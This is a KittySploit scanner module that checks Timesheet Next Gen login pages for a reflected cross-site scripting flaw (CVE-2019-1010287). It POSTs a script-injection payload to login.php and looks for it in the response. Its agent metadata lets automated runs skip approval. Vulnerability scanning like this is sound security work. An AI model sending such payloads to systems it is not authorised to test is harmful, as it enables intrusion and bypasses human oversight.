#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Timesheet Next Gen 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Timesheet Next Gen <=1.5.3 - Cross-Site Scripting Detection',
        'description': 'Timesheet Next Gen 1.5.3 and earlier is vulnerable to cross-site scripting that allows an attacker to execute arbitrary HTML and JavaScript code via a "redirect" parameter. The component is: Web login form: login.php, lines 40 and 54. The attack vector is: reflected XSS, victim may click the malicious url.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'timesheet', 'xss', 'timesheet_next_gen_project', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'http://www.mdh-tz.info/',
            'https://sourceforge.net/p/tsheetx/discussion/779083/thread/7fcb52f696/',
            'https://sourceforge.net/p/tsheetx/code/497/tree/branches/legacy/login.php#l40',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-1010287',
        ],
        'cve': 'CVE-2019-1010287',
    }

    def run(self):
        path = '/timesheet/login.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='username=%27%22%3E%3Cscript%3Ejavascript%3Aalert%28document.domain%29%3C%2Fscript%3E&password=pd&submit=Login\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('><script>javascript:alert(document.domain)</script>',)
        if any(m in body for m in body_any):
            self.set_info(severity='medium', reason='Timesheet Next Gen <=1.5.3 - Cross-Site Scripting detected', path=path)
            return True
        return False

